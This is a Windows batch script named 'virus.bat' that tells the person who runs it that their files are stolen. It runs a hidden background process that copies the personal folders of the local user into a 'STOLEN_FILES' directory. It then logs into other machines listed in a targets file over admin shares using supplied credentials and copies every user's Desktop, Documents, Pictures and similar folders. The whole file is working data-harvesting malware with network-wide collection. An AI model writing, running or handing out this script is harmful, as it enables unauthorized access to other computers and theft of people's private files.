@echo off
setlocal
title virus.bat
color 0A

REM ---------------- config ----------------
set "DEST=%USERPROFILE%\STOLEN_FILES"
set "LOCALSRC=%USERPROFILE%"
set "TARGETFILE=%~dp0targets.txt"
REM fallback login for targets: DOMAIN\user and password (blank = current account)
set "GUSER="
set "GPASS="
REM ----------------------------------------

if /i "%~1"=="--theft" goto theft

cls
echo.
echo  ==============================================================
echo.
echo   Hi, it seems you have very stupidly opened the file named
echo.
echo        "virus.bat"
echo.
echo   Now of course this is a virus. I have stolen all your files.
echo.
echo   Have a nice day.
echo.
echo  ==============================================================
echo.
echo   Target      : %LOCALSRC% and every machine in targets.txt
echo   Loot folder : %DEST%
echo.
timeout /t 5 >nul

echo   Beginning theft...
echo.
echo   (Press Ctrl+C all you want - the stealing runs in its own
echo    process and will finish without you.)
echo.

del "%TEMP%\virus_done.flag" >nul 2>&1
start "" /min cmd /c ""%~f0" --theft"

set /a SPIN=0
:wait
timeout /t 2 >nul
set /a SPIN+=1
if exist "%TEMP%\virus_done.flag" goto report
if %SPIN% GEQ 900 goto stuck
goto wait

:report
echo.
echo   Done. Everything is now in:
echo   %DEST%
echo.
if exist "%DEST%\_report.txt" type "%DEST%\_report.txt"
echo.
dir "%DEST%" /s /-c | find "File(s)"
echo.
del "%TEMP%\virus_done.flag" >nul 2>&1
pause
exit /b

:stuck
echo.
echo   Still running. Check back in:
echo   %DEST%
pause
exit /b

:theft
break off
if not exist "%DEST%" mkdir "%DEST%" >nul 2>&1
del "%DEST%\_report.txt" >nul 2>&1

REM ---- 1. this machine ----
for %%F in (Desktop Documents Downloads Pictures Videos Music) do (
    if exist "%LOCALSRC%\%%F" robocopy "%LOCALSRC%\%%F" "%DEST%\%COMPUTERNAME%\%%F" /E /R:1 /W:1 /NFL /NDL /NJH /NJS /NP >nul
)
echo   [+] %COMPUTERNAME% (local)>>"%DEST%\_report.txt"

REM ---- 2. other machines ----
if not exist "%TARGETFILE%" goto done
for /f "usebackq eol=# tokens=1,2,3 delims=|" %%A in ("%TARGETFILE%") do (
    if not "%%A"=="" call :grabhost "%%A" "%%B" "%%C"
)

:done
break on
echo done>"%TEMP%\virus_done.flag"
exit /b

:grabhost
set "H=%~1"
set "U=%~2"
set "P=%~3"
if "%U%"=="" set "U=%GUSER%"
if "%P%"=="" set "P=%GPASS%"

ping -n 1 -w 1200 "%H%" >nul 2>&1
if errorlevel 1 (
    echo   [x] %H% - unreachable>>"%DEST%\_report.txt"
    exit /b
)

if not "%U%"=="" (
    net use "\\%H%\IPC$" /user:"%U%" "%P%" >nul 2>&1
) else (
    net use "\\%H%\IPC$" >nul 2>&1
)
if errorlevel 1 (
    echo   [x] %H% - login refused>>"%DEST%\_report.txt"
    exit /b
)

for /d %%U2 in ("\\%H%\C$\Users\*") do (
    call :grabuser "%H%" "%%~nxU2"
)

net use "\\%H%\IPC$" /delete >nul 2>&1
echo   [+] %H% - copied>>"%DEST%\_report.txt"
exit /b

:grabuser
set "H=%~1"
set "UN=%~2"
for %%F in (Desktop Documents Downloads Pictures Videos Music) do (
    if exist "\\%H%\C$\Users\%UN%\%%F" robocopy "\\%H%\C$\Users\%UN%\%%F" "%DEST%\%H%\%UN%\%%F" /E /R:1 /W:1 /NFL /NDL /NJH /NJS /NP >nul
)
exit /b